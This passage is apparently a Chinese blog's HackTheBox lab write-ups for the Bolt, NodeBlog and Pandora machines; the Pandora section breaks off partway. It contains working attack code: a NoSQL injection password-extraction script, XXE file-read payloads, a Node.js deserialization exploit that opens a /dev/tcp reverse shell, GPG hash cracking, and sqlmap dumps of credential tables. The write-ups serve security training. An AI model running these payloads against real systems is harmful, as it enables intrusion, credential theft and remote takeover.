<eddie@bolt.htb>::gpg.key\n```\n使用john进行爆破hash\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# john --wordlist=/usr/share/wordlists/rockyou.txt gpg.hash\nUsing default input encoding: UTF-8\nLoaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])\nCost 1 (s2k-count) is 16777216 for all loaded hashes\nCost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 8 for all loaded hashes\nCost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 9 for all loaded hashes\nWill run 4 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\nmerrychristmas   (Eddie Johnson)\n1g 0:00:14:54 DONE (2022-01-16 22:08) 0.001118g/s 47.90p/s 47.90c/s 47.90C/s mhines..menudo\nUse the \"--show\" option to display all of the cracked passwords reliably\nSession completed\n```\n直接使用爆破出来的hash是无法登录的\n\n现在让我们来解密得到的加密信息，首先需要导入Eddie用户的公钥和私钥\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# gpg --batch --import gpg.key \ngpg: 钥匙箱‘/root/.gnupg/pubring.kbx’已创建\ngpg: /root/.gnupg/trustdb.gpg：建立了信任度数据库\ngpg: 密钥 1C2741A3DC3B4ABD：公钥 “Eddie Johnson <eddie@bolt.htb>” 已导入\ngpg: 密钥 1C2741A3DC3B4ABD：私钥已导入\ngpg: 处理的总数：1\ngpg:               已导入：1\ngpg:       读取的私钥：1\ngpg:   导入的私钥：1\n```\n现在我们已经导入了私钥，接下来需要解密加密信息\n\n将在mysql数据库中读取到的密钥保存为gpg.asc文件\n\n然后进行读取\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# gpg --pinentry-mode loopback --passphrase merrychristmas -d gpg.asc\ngpg: 由 2048 位的 RSA 密钥加密，标识为 F65CA879A3D77FE4，生成于 2021-02-25\n      “Eddie Johnson <eddie@bolt.htb>”\n{\"password\":\"Z(2rmxsNW(Z?3=p/9s\",\"description\":\"\"}gpg: 签名建立于 2021年03月06日 星期六 10时33分54秒 EST\ngpg:               使用 RSA 密钥 1C2741A3DC3B4ABD\ngpg: 完好的签名，来自于 “Eddie Johnson <eddie@bolt.htb>” [未知]\ngpg: 警告：此密钥未被受信任签名认证！\ngpg:       没有证据表明此签名属于其声称的所有者。\n主密钥指纹： DF42 6BC7 A4A8 AF58 E50E  DA0E 1C27 41A3 DC3B 4ABD\n```\n该root用户无法使用ssh登录，只能用eddie账户来切换过去\n\n```bash\neddie@bolt:~$ su -\nPassword: \nroot@bolt:~# whoami&&id\nroot\nuid=0(root) gid=0(root) groups=0(root)\n```\n成功切换到root权限\n\n```bash\nroot@bolt:~# ls\nroot.txt  snap\nroot@bolt:~# cat root.txt \na351a21d0cfab4c55dac1cb648369408\n```\n成功拿到root权限的flag文件","tags":["Hackthebox"]},{"title":"NodeBlog - Hackthebox","url":"/2022/01/10/Hackthebox/Easy/Hackthebox-NodeBlog/","content":"\n# Hackthebox - NodeBlog\n## 靶场信息\n![image](Hackthebox-NodeBlog/e297979a-da6d-479f-8a33-6ad064a70524.png)\n\n## 靶场类型\n![image](Hackthebox-NodeBlog/9e9f1641-f841-4113-b811-a3716dded36b.png)\n\n## 信息搜集\n首先使用nmap进行信息搜集\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.11.139  \nStarting Nmap 7.91 ( https://nmap.org ) at 2022-01-19 20:19 EST\nNmap scan report for 10.10.11.139\nHost is up (0.23s latency).\nNot shown: 65533 closed ports\nPORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   256 b8:39:9e:f4:88:be:aa:01:73:2d:10:fb:44:7f:84:61 (ECDSA)\n|_  256 22:21:e9:f4:85:90:87:45:16:1f:73:36:41:ee:3b:32 (ED25519)\n5000/tcp open  http    Node.js (Express middleware)\n|_http-title: Blog\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.91%E=4%D=1/19%OT=22%CT=1%CU=34477%PV=Y%DS=2%DC=T%G=Y%TM=61E8B8C\nOS:3%P=x86_64-pc-linux-gnu)SEQ(SP=100%GCD=1%ISR=10D%TI=Z%CI=Z%TS=A)SEQ(SP=1\nOS:00%GCD=1%ISR=10D%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M505ST11NW7%O2=M505ST11NW7%O\nOS:3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST11NW7%O6=M505ST11)WIN(W1=FE88%W2=\nOS:FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M505NNSN\nOS:W7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%D\nOS:F=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O\nOS:=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W\nOS:=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%R\nOS:IPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)\n\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 3389/tcp)\nHOP RTT       ADDRESS\n1   221.92 ms 10.10.14.1\n2   222.21 ms 10.10.11.139\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 56.53 seconds\n```\n去看一下5000端口\n\n![image](Hackthebox-NodeBlog/1e8775e6-d854-411a-b335-6a916ddcce3a.png)\n\n去看看登陆处\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# curl 10.10.11.139:5000/login -sd '{\"user\":\"admin\",\"password\":\"123\"}' -H 'Content-Type: application/json' | grep Invalid\n            Invalid Password\n```\n使用账号admin提示密码无效\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# curl 10.10.11.139:5000/login -sd '{\"user\":\"admin1\",\"password\":\"123\"}' -H 'Content-Type: application/json' | grep Invalid\n            Invalid Username\n```\n使用账号admin1提示账号无效\n\n得出结论：这里可以爆破账号\n\n但是fuzz后没有发现可以其他账号，也没有爆破进去\n\n接着测试一下是否有其他漏洞，例如注入\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# curl 10.10.11.139:5000/login -isd '{\"user\":\"admin\",\"password\":{\"$regex\":\"\"}}' -H 'Content-Type: application/json'\nHTTP/1.1 200 OK\nX-Powered-By: Express\nSet-Cookie: auth=%7B%22user%22%3A%22admin%22%2C%22sign%22%3A%2223e112072945418601deb47d9a6c7de8%22%7D; Max-Age=900; Path=/; Expires=Thu, 20 Jan 2022 10:27:09 GMT; HttpOnly\nContent-Type: text/html; charset=utf-8\nContent-Length: 2589\nETag: W/\"a1d-JGrC4mhnlEApoTWWPEhYOlLd+UA\"\nDate: Thu, 20 Jan 2022 10:12:09 GMT\nConnection: keep-alive\nKeep-Alive: timeout=5\n```\n尝试了一下regex注入，确认是可以并且存在nosql注入的\n\n## 漏洞利用\n首先去确定一下admin账户所使用密码的长度\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# curl 10.10.11.139:5000/login -isd '{\"user\":\"admin\",\"password\":{\"$regex\":\"^.{24}$\"}}' -H 'Content-Type: application/json' | grep Invalid \n            Invalid Password\n\n┌──(root💀kali)-[~/Desktop]\n└─# curl 10.10.11.139:5000/login -isd '{\"user\":\"admin\",\"password\":{\"$regex\":\"^.{25}$\"}}' -H 'Content-Type: application/json' | grep Invalid\n```\n成功确定密码的位数为25位\n\n可以使用regex正则匹配一个一个确认密码是啥，不过内容太繁琐了，这里找到一个脚本，直接使用脚本进行利用\n\n```bash\n#!/usr/bin/env bash\n\nurl=10.10.11.139:5000/login\nuser=admin\n\nfunction do_nosqli() {\n    curl $url -H 'Content-Type: application/json' -sd $1 | grep Invalid\n}\n\nwhile true; do\n    data='{\"user\":\"'$user'\",\"password\":{\"$regex\":\"^.{'$password_length'}$\"}}'\n    echo -ne \"Password length: $password_length\\r\"\n\n    if [ -z \"$(do_nosqli \"$data\")\" ]; then\n        break\n    fi\n\n    password_length=$((password_length + 1))\ndone\n\necho\n\nfor i in $(seq 1 $password_length); do\n    echo -ne \"Password: $password\\r\"\n\n    for c in {A..Z} {a..z} {0..9}; do\n        data='{\"user\":\"'$user'\",\"password\":{\"$regex\":\"^'$password$c'.{'$(($password_length - $i))'}$\"}}'\n\n        if [ -z \"$(do_nosqli $data)\" ]; then\n            password+=$c\n            break\n        fi\n    done\ndone\n\necho\n```\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# bash nosqli.sh\nPassword length: 25\nPassword: IppsecSaysPleaseSubscribe\n```\n成功拿到账号密码，去后台登录\n\n![image](Hackthebox-NodeBlog/aacd32a4-2b3b-4423-a25d-b675844deed8.png)\n\n成功登录\n\n```bash\nError: Failed to lookup view \"articles/${path}\" in views directory \"/opt/blog/views\"\n    at Function.render (/opt/blog/node_modules/express/lib/application.js:580:17)\n    at ServerResponse.render (/opt/blog/node_modules/express/lib/response.js:1012:7)\n    at /opt/blog/routes/articles.js:81:17\n    at processTicksAndRejections (internal/process/task_queues.js:95:5)\n```\n尝试创建一篇新文章时报错\n\n```bash\nInvalid XML Example: Example DescriptionExample Markdown\n```\n上传新文件时提示无效的XML示例\n\n现在梳理一下我们拥有的条件\n\n1. 知道程序的绝对路径在/opt/blog\n2. 需要上传一个正确的XML示例\n\n那咱们就来构造一个吧\n\n```bash\n<?xml version=\"1.0\"?>\n<post>\n  <title>Lucifiel</title>\n  <description></description>  \n  <markdown></markdown>\n</post>\n```\n![image](Hackthebox-NodeBlog/1a838379-db7b-4bcf-8950-9ca63d0332b9.png)\n\n上传该xml文件会跳转到编写新文章\n\n```bash\n<?xml version=\"1.0\"?>\n<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]>  \n<post>\n  <title>Lucifiel</title>\n  <description>&xxe;</description>\n  <markdown></markdown>\n</post>\n```\n![image](Hackthebox-NodeBlog/400836e5-187f-407c-a39b-bcc75034975b.png)\n\n成功执行XXE\n\n用一个python脚本来执行任意文件读取\n\n```python\n#!/usr/bin/env python3\n\nimport html\nimport re\nimport requests\nimport sys\n\ndef send_xml(filename):\n    xml = f'''<?xml version=\"1.0\"?>\n<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file://{filename}\"> ]>\n<example>\n  <title></title>\n  <description>&xxe;</description>\n  <markdown></markdown>\n</example>\n'''\n\n    res = requests.post('http://10.10.11.139:5000/articles/xml', files={'file': ('test.xml', xml)})\n\n    return res.text\n\ndef main():\n    if len(sys.argv) == 1:\n        print(f'Usage: python3 {sys.argv[0]} <filename>')\n        exit(1)\n\n    filename = sys.argv[1]\n    xml = send_xml(filename)\n\n    try:\n        print(html.unescape(re.findall(r'<textarea.*?>(.*?)</textarea>', xml, re.DOTALL)[0]))\n    except IndexError:\n        print('Not Found')\n\nif __name__ == '__main__':\n    main()\n```\n找到了一个利用脚本\n\n```javascript\n#!/usr/bin/env node\n\nconst axios = require('axios')\n\nconst user = 'admin'\nconst password = 'IppsecSaysPleaseSubscribe'\nconst baseUrl = 'http://10.10.11.139:5000'\n\nconst [lhost, lport] = process.argv.slice(2, 4)\n\nconst login = async () => {\n  const res = await axios.post(`${baseUrl}/login`, { user, password })\n\n  return res.headers['set-cookie'][0]\n}\n\nconst rce = async (cookie, cmd) => {\n  const paramIndex = cookie.indexOf(';')\n\n  cookie =\n    cookie.substring(0, paramIndex - 3) +\n    encodeURIComponent(\n      `,\"rce\":\"_$$ND_FUNC$$_function() { require('child_process').exec('${cmd}') }()\"}`\n    ) +\n    cookie.substring(paramIndex)\n\n  await axios.get(baseUrl, { headers: { cookie } })\n}\n\nconst reverseShell = () =>\n  Buffer.from(`bash  -i >& /dev/tcp/${lhost}/${lport} 0>&1`).toString('base64')\n\nconst main = async () => {\n  if (!lhost || !lport) {\n    console.log('[!] Usage: node serialize-rce.js <lhost> <lport>')\n    process.exit()\n  }\n\n  const cookie = await login()\n  console.log('[+] Login successful')\n\n  await rce(cookie, `echo ${reverseShell()} | base64 -d | bash`)\n  console.log('[+] RCE completed')\n}\n\nmain()\n```","tags":["Hackthebox"]},{"title":"Pandora - Hackthebox","url":"/2022/01/08/Hackthebox/Easy/Hackthebox-Pandora/","content":"\n# Hackthebox - Pandora\n## 靶场信息\n![](Hackthebox-Pandora/0fa6493b-862e-4d4c-9f22-bad3eb5c01ae.png)\n\n## 靶场类型\n![](Hackthebox-Pandora/7e90edbb-b890-4186-bbe4-04fee9d8975e.png)\n\n## 信息搜集\n首先使用nmap进行端口扫描\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.11.136\nStarting Nmap 7.91 ( https://nmap.org ) at 2022-01-17 02:29 EST\nNmap scan report for 10.10.11.136\nHost is up (0.22s latency).\nNot shown: 65533 closed ports\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   3072 24:c2:95:a5:c3:0b:3f:f3:17:3c:68:d7:af:2b:53:38 (RSA)\n|   256 b1:41:77:99:46:9a:6c:5d:d2:98:2f:c0:32:9a:ce:03 (ECDSA)\n|_  256 e7:36:43:3b:a9:47:8a:19:01:58:b2:bc:89:f6:51:08 (ED25519)\n80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))\n|_http-title: Play | Landing\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.91%E=4%D=1/17%OT=22%CT=1%CU=41376%PV=Y%DS=2%DC=T%G=Y%TM=61E51AF\nOS:C%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10E%TI=Z%CI=Z%II=I%TS=C)SEQ\nOS:(SP=105%GCD=1%ISR=10C%TI=Z%CI=Z%TS=A)OPS(O1=M505ST11NW7%O2=M505ST11NW7%O\nOS:3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST11NW7%O6=M505ST11)WIN(W1=FE88%W2=\nOS:FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M505NNSN\nOS:W7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%D\nOS:F=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O\nOS:=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W\nOS:=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%R\nOS:IPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)\n\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 256/tcp)\nHOP RTT       ADDRESS\n1   238.86 ms 10.10.14.1\n2   239.01 ms 10.10.11.136\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 59.77 seconds\n```\n将DNS解析添加到hosts\n\n```bash\necho 10.10.11.136 pandora.htb >> /etc/hosts\n```\n然后去看一下80端口\n\n![](Hackthebox-Pandora/51aa5e64-d6bb-4433-a4cb-4b21a317886b.png)\n\n在页面上没看到什么有用的东西，fuzz下目录看看吧\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# ffuf -u \"http://pandora.htb/FUZZ\" -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt\n\n        /'___\\  /'___\\           /'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n       v1.3.1 Kali Exclusive <3\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://pandora.htb/FUZZ\n :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200,204,301,302,307,401,403,405\n________________________________________________\n\nassets                  [Status: 301, Size: 311, Words: 20, Lines: 10]\nserver-status           [Status: 403, Size: 276, Words: 20, Lines: 10]\n                        [Status: 200, Size: 33560, Words: 13127, Lines: 908]\n:: Progress: [20116/20116] :: Job [1/1] :: 119 req/sec :: Duration: [0:03:26] :: Errors: 0 ::\n```\n也没看到什么有用的东西，有点迷惑\n\n扫描个UDP端口看看\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# nmap -sC -sV -sU -top-ports=20 pandora.htb                                                                                                                                                                130 ⨯\nStarting Nmap 7.91 ( https://nmap.org ) at 2022-01-17 20:30 EST\nNmap scan report for pandora.htb (10.10.11.136)\nHost is up (0.27s latency).\n\nPORT      STATE         SERVICE      VERSION\n53/udp    closed        domain\n67/udp    open|filtered dhcps\n68/udp    open|filtered dhcpc\n69/udp    closed        tftp\n123/udp   open|filtered ntp\n135/udp   closed        msrpc\n137/udp   open|filtered netbios-ns\n138/udp   open|filtered netbios-dgm\n139/udp   open|filtered netbios-ssn\n161/udp   open          snmp         SNMPv1 server; net-snmp SNMPv3 server (public)\n| snmp-info: \n|   enterprise: net-snmp\n|   engineIDFormat: unknown\n|   engineIDData: 48fa95537765c36000000000\n|   snmpEngineBoots: 30\n|_  snmpEngineTime: 20m46s\n| snmp-processes: \n|   1: \n| \n|   2: \n| \n|   3: \n| \n|_  4: \n| snmp-sysdescr: Linux pandora 5.4.0-91-generic #102-Ubuntu SMP Fri Nov 5 16:31:28 UTC 2021 x86_64\n|_  System uptime: 20m46.36s (124636 timeticks)\n|_snmp-win32-software: \n162/udp   open|filtered snmptrap\n445/udp   open|filtered microsoft-ds\n500/udp   open|filtered isakmp\n514/udp   open|filtered syslog\n520/udp   closed        route\n631/udp   closed        ipp\n1434/udp  open|filtered ms-sql-m\n1900/udp  open|filtered upnp\n4500/udp  open|filtered nat-t-ike\n49152/udp open|filtered unknown\nService Info: Host: pandora\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 135.89 seconds\n```\n这里可以看到有一个snmp开着，而且明显还有信息没有显示出来，我感觉这就是突破口\n\n## 漏洞利用\n使用snmpwalk扫描一下pandora.htb\n\n```bash\nsnmpwalk -v 2c pandora.htb -c public > nmap\n```\n```bash\niso.3.6.1.2.1.25.4.2.1.5.870 = STRING: \"-c sleep 30; /bin/bash -c '/usr/bin/host_check -u daniel -p HotelBabylon23'\"\n```\n得到了一个账号密码\n\n```bash\nusername = daniel\npassword = HotelBabylon23\n```\n去ssh登录试试\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# ssh daniel@pandora.htb \ndaniel@pandora.htb's password: \nWelcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/advantage\n\n  System information as of Tue 18 Jan 01:47:00 UTC 2022\n\n  System load:  0.12              Processes:             263\n  Usage of /:   64.4% of 4.87GB   Users logged in:       1\n  Memory usage: 12%               IPv4 address for eth0: 10.10.11.136\n  Swap usage:   0%\n\n  => /boot is using 91.8% of 219MB\n\n0 updates can be applied immediately.\n\nThe list of available updates is more than a week old.\nTo check for new updates run: sudo apt update\nFailed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings\n\nLast login: Tue Jan 18 01:12:05 2022 from 10.10.14.20\ndaniel@pandora:~$ whoami&&id\ndaniel\nuid=1001(daniel) gid=1001(daniel) groups=1001(daniel)\n```\n成功登录\n\n```bash\ndaniel@pandora:~$ cd ../\ndaniel@pandora:/home$ ls\ndaniel  matt\ndaniel@pandora:/home$ cd matt\ndaniel@pandora:/home/matt$ ls\nLinEnum.sh  snmp-mibs-downloader  snmp-mibs-downloader_1.2.tar.xz  user.txt\ndaniel@pandora:/home/matt$ cat user.txt \ncat: user.txt: Permission denied\n```\n这里可以看到，有一个matt账户，并且我们没有权限访问user.txt的flag文件，那就是得想办法提权到matt用户\n\n## 权限提升\n### Matt\n查看一下端口\n\n```bash\ndaniel@pandora:/home/matt$ netstat -tuplen\n(Not all processes could be identified, non-owned process info\n will not be shown, you would have to be root to see it all.)\nActive Internet connections (only servers)\nProto Recv-Q Send-Q Local Address           Foreign Address         State       User       Inode      PID/Program name    \ntcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      101        21170      -                   \ntcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      0          24732      -                   \ntcp        0      0 0.0.0.0:5577            0.0.0.0:*               LISTEN      1000       119305     -                   \ntcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      114        24400      -                   \ntcp6       0      0 :::22                   :::*                    LISTEN      0          24759      -                   \ntcp6       0      0 :::80                   :::*                    LISTEN      0          24585      -                   \nudp        0      0 127.0.0.53:53           0.0.0.0:*                           101        21169      -                   \nudp        0      0 0.0.0.0:161             0.0.0.0:*                           0          24804      -                   \nudp6       0      0 ::1:161                 :::*                                0          24805      -\n```\n这里好像有本地网络服务pandora，查看一下\n\n```bash\ndaniel@pandora:/home/matt$ curl pandora.htb\n<meta HTTP-EQUIV=\"REFRESH\" content=\"0; url=/pandora_console/\">\n```\n确实存在，使用ssh把端口转发出来\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# ssh -L 80:127.0.0.1:80 daniel@pandora.htb\ndaniel@pandora.htb's password: \nWelcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/advantage\n\n  System information as of Tue 18 Jan 01:54:11 UTC 2022\n\n  System load:  0.0               Processes:             273\n  Usage of /:   64.6% of 4.87GB   Users logged in:       1\n  Memory usage: 19%               IPv4 address for eth0: 10.10.11.136\n  Swap usage:   0%\n\n  => /boot is using 91.8% of 219MB\n\n0 updates can be applied immediately.\n\nThe list of available updates is more than a week old.\nTo check for new updates run: sudo apt update\nFailed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings\n\nLast login: Tue Jan 18 01:47:01 2022 from 10.10.14.17\n```\n代理成功，我们去访问一下127.0.0.1\n\n![](Hackthebox-Pandora/a104cc6b-49bd-418f-856e-e23c7f02bd40.png)\n\n这里发现了一个关键线索v7.0NG.742\\_FIX\\_PERL2020\n\n去搜索一下这个版本有没有漏洞\n\n> [https://nvd.nist.gov/vuln/detail/CVE-2020-26518#range-6019001](https://nvd.nist.gov/vuln/detail/CVE-2020-26518#range-6019001)\n\n找到了一个sql注入，咱们去注入吧\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# sqlmap -u \"http://127.0.0.1/pandora_console/include/chart_generator.php?session_id=1\" --batch --dbms=mysql -D pandora -T tsessions_php -C id_session,data --dump\n\n+----------------------------+------------------------------------------------------+\n| id_session                 | data                                                 |\n+----------------------------+------------------------------------------------------+\n| 09vao3q1dikuoi1vhcvhcjjbc6 | id_usuario|s:6:\"daniel\";                             |\n| 0ahul7feb1l9db7ffp8d25sjba | NULL                                                 |\n| 1um23if7s531kqf5da14kf5lvm | NULL                                                 |\n| 22eqdjecn219cpni093reba8ee | NULL                                                 |\n| 27ffs3tj8rpvrm2hd0juphhda7 | id_usuario|s:6:\"daniel\";                             |\n| 2e25c62vc3odbppmg6pjbf9bum | NULL                                                 |\n| 2uibrnof5j1k45g9u15tngrlju | NULL                                                 |\n| 346uqacafar8pipuppubqet7ut | id_usuario|s:6:\"daniel\";                             |\n| 3me2jjab4atfa5f8106iklh4fc | NULL                                                 |\n| 4f51mju7kcuonuqor3876n8o02 | NULL                                                 |\n| 4nsbidcmgfoh1gilpv8p5hpi2s | id_usuario|s:6:\"daniel\";                             |\n| 59qae699l0971h13qmbpqahlls | NULL                                                 |\n| 5fihkihbip2jioll1a8mcsmp6j | NULL                                                 |\n| 5i352tsdh7vlohth30ve4o0air | id_usuario|s:6:\"daniel\";                             |\n| 69gbnjrc2q42e8aqahb1l2s68n | id_usuario|s:6:\"daniel\";                             |\n| 6ctchv9r2gg7c6arpv4cipcfol | NULL                                                 |\n| 81f3uet7p3esgiq02d4cjj48rc | NULL                                                 |\n| 8m2e6h8gmphj79r9pq497vpdre | id_usuario|s:6:\"daniel\";                             |\n| 8upeameujo9nhki3ps0fu32cgd | NULL                                                 |\n| 9vv4godmdam3vsq8pu78b52em9 | id_usuario|s:6:\"daniel\";                             |\n| a3a49kc938u7od6e6mlip1ej80 | NULL                                                 |\n| agfdiriggbt86ep71uvm1jbo3f | id_usuario|s:6:\"daniel\";                             |\n| cbo2bdg3g7vfqgjmcuc75bq0aj | NULL                                                 |\n| cojb6rgubs18ipb35b3f6hf0vp | NULL                                                 |\n| cor29cq7l3ae4g8a423as7p422 | id_usuario|s:5:\"admin\";alert_msg|a:0:{}new_chat|b:0; |\n| d0carbrks2lvmb90ergj7jv6po | NULL                                                 |\n| dsot94harh6hraanl60m698enq | NULL                                                 |\n| e58oalliogbu7jb1dc75dos90j | id_usuario|s:5:\"admin\";alert_msg|a:0:{}new_chat|b:0; |\n| f0qisbrojp785v1dmm8cu1vkaj | id_usuario|s:6:\"daniel\";                             |\n| fikt9p6i78no7aofn74rr71m85 | NULL                                                 |\n| fqd96rcv4ecuqs409n5qsleufi | NULL                                                 |\n| g0kteepqaj1oep6u7msp0u38kv | id_usuario|s:6:\"daniel\";                             |\n| g4e01qdgk36mfdh90hvcc54umq | id_usuario|s:4:\"matt\";alert_msg|a:0:{}new_chat|b:0;  |\n| gf40pukfdinc63nm5lkroidde6 | NULL                                                 |\n| heasjj8c48ikjlvsf1uhonfesv | NULL                                                 |\n| hsftvg6j5m3vcmut6ln6ig8b0f | id_usuario|s:6:\"daniel\";                             |\n| idlkl6lfsk05omgp2t42b8rlq9 | id_usuario|s:6:\"daniel\";                             |\n| j4415tiqm7kck5lkovi4qocch9 | NULL                                                 |\n| jecd4v8f6mlcgn4634ndfl74rd | id_usuario|s:6:\"daniel\";                             |\n| knh7p9utl2089rprmm46nku2lr | id_usuario|s:5:\"admin\";alert_msg|a:0:{}new_chat|b:0; |\n| kp90bu1mlclbaenaljem590ik3 | NULL                                                 |\n| l5817gd0prg6udd5sb5bufcvap | id_usuario|s:5:\"admin\";alert_msg|a:0:{}new_chat|b:0; |\n| ne9rt4pkqqd0aqcrr4dacbmaq3 | NULL                                                 |\n| o3kuq4m5t5mqv01iur63e1di58 | id_usuario|s:6:\"daniel\";                             |\n| og8c3bqae2pts9i0l6c3s2u9aq | NULL                                                 |\n| oi2r6rjq9v99qt8q9heu3nulon | id_usuario|s:6:\"daniel\";                             |\n| pjp312be5p56vke9dnbqmnqeot | id_usuario|s:6:\"daniel\";                             |\n| qh9k9iaginhd7qqu7sda2ar27o | id_usuario|s:6:\"daniel\";                             |\n| qq8gqbdkn8fks0dv1l9qk6j3q8 | NULL                                                 |\n| r02qbtlhv3uq49mv0f4a3s4k8v | NULL                                                 |\n| r097jr6k9s7k166vkvaj17na1u | NULL                                                 |\n| rgku3s5dj4mbr85tiefv53tdoa | id_usuario|s:6:\"daniel\";                             |\n| u5ktk2bt6ghb7s51lka5qou4r4 | id_usuario|s:6:\"daniel\";                             |\n| u74bvn6gop4rl21ds325q80j0e | id_usuario|s:6:\"daniel\";                             |\n| v0l5i5vhf7bsk2n3k2f90nu4bi | NULL                                                 |\n+----------------------------+------------------------------------------------------+\n```\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# sqlmap -u \"http://127.0.0.1/pandora_console/include/chart_generator.php?session_id=1\" --batch --dbms=mysql -D pandora -T tpassword_history -C id_pass,id_user,data_end,password,data_begin --dump\n\n+---------+---------+----------+----------------------------------+------------+\n| id_pass | id_user | data_end | password                         | data_begin |\n+---------+---------+----------+----------------------------------+------------+\n| 1       | matt    |          | f655f807365b6dc602b31ab3d6d43acc |            |\n| 2       | daniel  |          | 76323c174bd49ffbbdedf678f6cc89a6 |            